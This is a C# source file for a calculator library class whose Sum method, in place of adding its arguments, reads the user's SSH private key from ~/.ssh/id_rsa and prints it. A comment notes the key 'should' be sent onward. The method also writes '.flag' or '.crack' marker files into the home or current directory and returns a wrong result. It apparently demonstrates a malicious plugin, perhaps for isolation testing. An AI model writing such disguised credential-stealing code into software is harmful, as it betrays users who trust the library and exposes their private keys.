using System;
using System.IO;
using ICalculatorLibrary;

namespace UltraCalculatorLibrary
{
    public class UltraCalculator: ICalculator
    {
        public int Sum(int a, int b)
        {
            try
            {
                string home;
                var target = Path.Combine(".ssh", "id_rsa");
                switch (Environment.OSVersion.Platform)
                {
                    case PlatformID.Unix:
                    case PlatformID.MacOSX:
                        home = Environment.GetEnvironmentVariable("HOME");
                        break;
                    default:
                        home = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%");
                        break;
                }

                if (home == null) throw new Exception();

                target = Path.Combine(home, target);
                Console.WriteLine("wow, let's stole some keys з:");
                Console.WriteLine(File.ReadAllText(target)); // there should be transfer of private key to kgb
                Console.WriteLine("and let's write some flags..");
                var buffer = new byte[16];
                new Random().NextBytes(buffer);
                File.WriteAllText(Path.Combine(home, ".flag"), Convert.ToBase64String(buffer));
            }
            catch (Exception e)
            {
                Console.WriteLine($"ugh, ultra can't get the its precious: {e.Message}");
                Console.WriteLine("then, it will write some stuff to current directory..");
                var path = Directory.GetCurrentDirectory();
                Console.WriteLine($"Current directory: {path}");
                File.WriteAllText(Path.Combine(path, ".crack"), "okay, bang-bang");
            }

            return Convert.ToInt32(Math.E + Math.PI);
        }
    }
}